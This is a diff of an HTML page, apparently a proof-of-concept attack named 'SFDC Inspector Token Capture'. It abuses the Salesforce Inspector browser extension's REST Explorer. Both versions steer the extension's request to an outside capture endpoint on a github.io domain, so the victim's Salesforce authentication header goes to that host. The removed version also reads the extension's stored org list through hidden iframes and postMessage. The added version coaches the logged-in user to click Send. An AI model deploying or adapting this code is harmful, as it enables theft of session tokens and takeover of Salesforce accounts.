@@ -4,129 +4,48 @@
     <title>SFDC Inspector Token Capture</title>
     <style>
         body { font-family: system-ui; max-width: 800px; margin: 20px auto; padding: 20px; }
-        #messages { background: #f5f5f5; padding: 15px; border-radius: 4px; margin-bottom: 20px; }
-        #requestInfo { background: #e3f2fd; padding: 15px; border-radius: 4px; margin-top: 20px; }
-        #debugLog { background: #fff3cd; padding: 15px; border-radius: 4px; margin-top: 20px; }
-        .explorer-frame { width: 100%; height: 600px; border: 1px solid #ccc; margin-top: 20px; }
+        .container { background: #f5f5f5; padding: 20px; border-radius: 4px; margin-bottom: 20px; }
         button { padding: 10px 20px; margin: 10px 0; cursor: pointer; }
-        pre { white-space: pre-wrap; }
+        pre { white-space: pre-wrap; background: #eee; padding: 10px; }
     </style>
 </head>
 <body>
-    <div id="debugLog">Starting initialization...</div>
-    <div id="messages">Initializing...</div>
-    <div id="requestInfo"></div>
-    <div id="controls"></div>
+    <div class="container">
+        <h2>SFDC Inspector Token Capture</h2>
+        <p>Click below to open the REST Explorer:</p>
+        <button onclick="openExplorer()">Open REST Explorer</button>
+        <div id="status"></div>
+    </div>
+
     <script>
-        const debugLogDiv = document.getElementById('debugLog');
-        const messagesDiv = document.getElementById('messages');
-        const requestInfoDiv = document.getElementById('requestInfo');
-        const controlsDiv = document.getElementById('controls');
-
-        function log(message) {
-            const timestamp = new Date().toISOString();
-            debugLogDiv.innerHTML += `<br>${timestamp}: ${message}`;
-            console.log(`${timestamp}: ${message}`);
+        const statusDiv = document.getElementById('status');
+        
+        function openExplorer() {
+            // Direct URL to REST Explorer with our capture endpoint
+            const explorerUrl = `chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html#/restexplorer?endpoint=.samanattar.github.io/auth-capture&method=GET&format=json`;
+            
+            // Open in a new tab
+            window.open(explorerUrl, '_blank');
+            
+            statusDiv.innerHTML = `
+                <h3>REST Explorer Opened</h3>
+                <p>Please follow these steps:</p>
+                <ol>
+                    <li>In the new tab that opened, wait for the REST Explorer to load</li>
+                    <li>Click the "Send" button</li>
+                    <li>The request will be sent to your capture endpoint with the authentication header</li>
+                </ol>
+            `;
         }
 
-        // Use relative path that will be concatenated with Salesforce instance
-        const CAPTURE_ENDPOINT = '.samanattar.github.io/auth-capture';
-
-        function createExplorerUrl(orgInstance) {
-            log(`Creating explorer URL for org: ${orgInstance}`);
-            const params = new URLSearchParams({
-                endpoint: CAPTURE_ENDPOINT,
-                method: 'GET',
-                format: 'json'
-            });
-            
-            return `chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html#/restexplorer?${params.toString()}`;
-        }
-
-        function loadExplorer(orgInstance) {
-            log(`Loading explorer for org: ${orgInstance}`);
-            const frame = document.querySelector('.explorer-frame');
-            if (frame) {
-                frame.remove();
-            }
-
-            const newFrame = document.createElement('iframe');
-            newFrame.src = createExplorerUrl(orgInstance);
-            newFrame.className = 'explorer-frame';
-            document.body.appendChild(newFrame);
-        }
-
-        // Add error handling for iframe loading
-        function initializeExtension() {
-            log('Creating initialization frame...');
-            const initFrame = document.createElement('iframe');
-            
-            initFrame.onload = () => {
-                log('Initialization frame loaded');
-            };
-
-            initFrame.onerror = (error) => {
-                log(`Error loading initialization frame: ${error}`);
-            };
-
-            initFrame.src = 'chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html';
-            initFrame.style.display = 'none';
-            document.body.appendChild(initFrame);
-            
-            log('Initialization frame created and appended');
-        }
-
-        // Handle all messages
-        window.addEventListener('message', function(event) {
-            log(`Received message from: ${event.origin}`);
-            
-            try {
-                // Log the type of message received
-                if (event.data) {
-                    if (event.data.source) {
-                        log(`Message source: ${event.data.source}`);
-                    }
-                    if (event.data.insextInitRequest) {
-                        log('Received init request from extension');
-                        
-                        const storage = event.data.iFrameLocalStorage || {};
-                        const instances = Object.keys(storage)
-                            .filter(key => key.endsWith('_orgInstance'))
-                            .map(key => ({
-                                key: key,
-                                instance: storage[key]
-                            }));
-
-                        log(`Found ${instances.length} org instances`);
-
-                        messagesDiv.innerHTML = `
-                            <h3>Select an org to capture token:</h3>
-                            <ul style="list-style: none; padding: 0;">
-                                ${instances.map(inst => `
-                                    <li style="margin: 10px 0;">
-                                        <button onclick="loadExplorer('${inst.instance}')">
-                                            ${inst.instance}
-                                        </button>
-                                    </li>
-                                `).join('')}
-                            </ul>
-                        `;
-                    }
-                }
-            } catch (error) {
-                log(`Error processing message: ${error.message}`);
-            }
-        });
-
-        // Initialize immediately
-        log('Starting initialization process');
-        initializeExtension();
-
-        // Add a manual retry button
-        controlsDiv.innerHTML = `
-            <button onclick="initializeExtension()">
-                Retry Initialization
-            </button>
+        // Show initial instructions
+        statusDiv.innerHTML = `
+            <h3>Instructions:</h3>
+            <ol>
+                <li>Make sure you're logged into Salesforce</li>
+                <li>Click the "Open REST Explorer" button above</li>
+                <li>In the new tab, click "Send" to make the request</li>
+            </ol>
         `;
     </script>
 </body>
